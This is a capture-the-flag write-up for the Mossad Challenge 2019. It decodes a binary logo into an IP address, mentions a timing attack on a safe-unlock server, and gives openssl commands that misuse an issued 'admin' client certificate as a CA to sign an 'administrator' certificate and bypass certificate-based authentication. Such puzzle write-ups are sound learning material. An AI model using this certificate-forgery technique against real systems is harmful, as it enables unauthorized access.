# Mossad Challenge 2019
## Entry Level
When we browse to https://r-u-ready-4.it/, we can see a weird logo with marked symbol and unmarked ones.
That's binary.
I'll use powershell to convert from binary to decimal:
```
[convert]::ToInt32("00100011",2)
35
[convert]::ToInt32("11110110",2)
246
[convert]::ToInt32("10011110",2)
158
[convert]::ToInt32("00110011",2)
51
```

And that's the site: http://35.246.158.51/
From there, we'll be redirected to http://3d375032374147a7865753e4bbc92682.xyz/

## 1st Challenge:
The 1st challenge welcome us with an APK download.
After looking inside the file, we found in Android_manifest.xml the string "look me on github".
Found it on: https://github.com/iwalk-locksmithers-app/server/blob/master/main.go
So in order to "Unlock" the safe, we'll use our client_id as a seed and attack using time based attack to find the password (my script).
The link I got is: http://3d375032374147a7865753e4bbc92682.xyz/XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX


## 2nd Challenge:
Redirection to http://759d8eba52184f538c8a4525680cfb33.xyz/
Mentioning the site http://missilesys.com/

This site is using certificate based authentication, so when using ssllabs to scan the certificate,
I've found that https://dev.missilesys.com/ which is also mentioned in the certificate.
Next, we'll need to create a certificate with admin:admin and import to access http://missilesys.com/.
However, still not possible to access settings - need to be administrator.

<img src="./Challenge_2.jpg">

### How to:
```
openssl genrsa -out admin.key
openssl req -new -key admin.key -out admin.csr (CN=admin, o=International Weapons Export Inc.)
```

Specify these files in the response.html file to download the signed P12 file from the server.

```
openssl pkcs12 -in admin.p12 -out admin.crt -clcerts -nokeys
openssl pkcs12 -in admin.p12 -out admin.key -nocerts -nodes
openssl x509 -req -days 365 -in administrator.csr -CA admin.crt -CAkey admin.key -set_serial 01 -out administrator.crt
openssl pkcs12 -export -cacerts -clcerts -in administrator.crt -inkey administrator.key -out administrator.p12
```
